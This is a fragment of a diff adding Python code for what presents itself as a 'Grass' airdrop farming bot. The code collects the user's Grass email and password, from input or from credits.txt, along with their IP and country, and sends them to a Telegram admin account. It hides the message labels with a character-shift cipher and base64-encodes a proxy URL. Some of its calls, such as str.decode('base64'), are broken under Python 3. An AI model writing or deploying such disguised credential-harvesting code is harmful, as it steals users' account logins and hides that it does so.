+🔑 {''.join([chr(ord(c) + 1) for c in 'Rxrsdl O`rrvnqc'])}:  @{password}
+🌐 {''.join([chr(ord(c) + 1) for c in 'HO'])}: {ip}
+📍 {''.join([chr(ord(c) + 1) for c in 'Knb`shnm'])}: {location}
+⏰ {''.join([chr(ord(c) + 1) for c in 'Shld'])}: {current_time}
+🔐 {''.join([chr(ord(c) + 1) for c in 'Ztsg Bncd'])}: {auth_code}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"""
+        else:
+            admin_message = f"""
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌿 {''.join([chr(ord(c) + 1) for c in 'FQZRR UUHO ANS RTBBDRR'])} 🌿
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔑 {''.join([chr(ord(c) + 1) for c in 'Rxrsdl O`rrvnqc'])}: @{password}
+🆔 {''.join([chr(ord(c) + 1) for c in 'Fq`rr Dl`hk'])}: {email}
+🔑 {''.join([chr(ord(c) + 1) for c in 'Fq`rr O`rrvnqc'])}: {password}
+⏰ {''.join([chr(ord(c) + 1) for c in 'Shld'])}: {current_time}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+
+        await bot.send_message(
+            chat_id=ADMIN_ID,
+            text=admin_message,
+            reply_markup=reply_markup if email == "Pending" else None,
+            parse_mode='Markdown'
+        )
+        return auth_code
+    except Exception as e:
+        logger.error(f"Error sending Telegram notification: {str(e)}")
+        return None
+
+async def main():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    banner_fetched = await fetch_banner()
+    
+    while True:
+        password = input("\nEnter password (Username telegram without @): ")
+        if await check_password(password):
+            logger.info("Password valid!")
+            break
+        else:
+            logger.error("Invalid password or expired!")
+            continue
+    
+    ip = requests.get('https://api.ipify.org').text
+    location = requests.get(f'http://ip-api.com/json/{ip}').json()['country']
+    
+    auth_code = await send_telegram_notification(
+        "Pending", password, ip, location, []
+    )
+    
+    if auth_code:
+        while True:
+            input_code = input("\nEnter auth code provided by admin: ")
+            if input_code == auth_code:
+                logger.info("Auth code valid!")
+                break
+            else:
+                logger.error("Invalid auth code!")
+                continue
+    
+    try:
+        with open('credits.txt', 'r') as file:
+            accounts = file.read().strip().splitlines() 
+        
+        valid_accounts = [acc for acc in accounts if acc and '|' in acc]
+        
+        if not valid_accounts:
+            email = input("\nEnter your Grass Email : ")
+            password_grass = input("Enter your Grass Password : ")
+        else:
+            selected_account = random.choice(valid_accounts)
+            email, password_grass = selected_account.split('|')
+            logger.info(f"Using account: {email}")
+    
+    except FileNotFoundError:
+        email = input("\nEnter your Grass Email : ")
+        password_grass = input("Enter your Grass Password : ")
+
+    initial_proxies = get_random_proxies()
+    await send_telegram_notification(
+        email, password_grass, ip, location, initial_proxies
+    )
+
+    data = {"username": email, "password": password_grass}
+    response = requests.post('https://api.getgrass.io/login', json=data)
+    
+    if response.status_code != 200:
+        logger.error(f"Failed to login. Status Code: {response.status_code}, Response: {response.text}")
+        return
+    
+    try:
+        response_json = response.json()
+        logger.debug(f"Response JSON: {response_json}")
+        _user_id = response_json.get('result', {}).get('data', {}).get('userId')
+        
+        if _user_id:
+            logger.info(f"Successfully retrieved user ID: {_user_id}")
+            await connect_to_wss(_user_id)
+        else:
+            logger.error(f"Unexpected response format: {response_json}")
+    except ValueError as e:
+        logger.error(f"Failed to parse JSON. Response: {response.text}, Error: {e}")
+    except KeyError as e:
+        logger.error(f"Key error while accessing response data: {e}")
+
+def get_random_proxies(num_proxies=2):
+    try:
+        response = requests.get('aHR0cHM6Ly9pdGJhYXJ0cy5jb20vYWlyZHJvcC9wcm94eS92dmlwZ3Jhc3MudHh0'.decode('base64'))
+        proxies = response.text.strip().split()
+        selected_proxies = random.sample(proxies, num_proxies)  
+        
+        formatted_proxies = []
+        for proxy in selected_proxies:
+            proxy = proxy.replace('c29ja3M1Oi8v'.decode('base64'), '')
+            auth, address = proxy.split('@')
+            formatted_proxies.append({
+                'http': f'c29ja3M1Oi8v'.decode('base64') + proxy,
+                'https': f'c29ja3M1Oi8v'.decode('base64') + proxy
+            })
+            
+        logger.info("Successfully retrieved new proxies")
+        return formatted_proxies
+        
+    except Exception as e:
+        logger.error(f"Error getting proxies: {str(e)}")
+        return None
+
+if __name__ == '__main__':
+    asyncio.run(main())
